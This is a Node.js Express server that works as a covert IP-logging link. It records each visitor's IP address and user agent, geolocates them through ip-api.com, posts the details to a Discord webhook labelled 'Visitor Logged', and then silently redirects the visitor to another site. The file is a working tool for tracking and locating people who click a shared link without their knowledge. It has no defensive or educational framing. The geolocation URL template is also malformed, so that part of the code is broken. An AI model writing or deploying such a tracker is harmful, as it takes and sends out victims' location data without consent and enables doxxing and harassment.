const express = require('express'); 
const app = express(); 

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK; 
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/', async (req, res) => { 
    // 1. Grab raw header tracking string safely 
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''; 

    // 2. Isolates the first clean IP address string before the first comma 
    let clientIp = rawIp.replace(/,.*$/, '').trim(); 

    // 3. Strip internal local nesting structures if they exist 
    if (clientIp.includes('::ffff:')) { 
        clientIp = clientIp.replace('::ffff:', ''); 
    } 

    // 4. Default to a valid public IP if local
    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
        clientIp = '8.8.8.8'; 
    } 

    const userAgent = req.headers['user-agent'] || 'Unknown'; 

    if (DISCORD_WEBHOOK_URL) { 
        try { 
            // CHANGED: Using ip-api.com which does not block cloud hosting environments
            const geoResponse = await fetch(`http://ip-api.com{clientIp}`); 
            const geoData = await geoResponse.json(); 

            // CHANGED: Properties updated to match the new API response layout
            const ispName = geoData.isp || "Unknown"; 
            const cityName = geoData.city || "Unknown"; 
            const countryName = geoData.country || "Unknown"; 

            const discordPayload = { 
                embeds: [{ 
                    title: "Visitor Logged", 
                    color: 15548997, 
                    description: "A user has accessed the tracking link.", 
                    fields: [ 
                        { name: "IP Address", value: "`" + clientIp + "`", inline: true }, 
                        { name: "ISP Network", value: "`" + ispName + "`", inline: true }, 
                        { name: "Location", value: "`" + cityName + ", " + countryName + "`", inline: false }, 
                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false } 
                    ], 
                    footer: { text: "System Monitor" }, 
                    timestamp: new Date().toISOString() 
                }] 
            }; 

            await fetch(DISCORD_WEBHOOK_URL, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify(discordPayload) 
            }); 
        } catch (error) { 
            console.error("Geo Data Retrieval Error:", error.message); 
        } 
    } 

    // 8. Instantly redirect the user 
    res.redirect(302, REDIRECT_URL); 
}); 

const PORT = process.env.PORT || 10000; 
app.listen(PORT, () => { 
    console.log(`Server running on port ${PORT}`); 
});
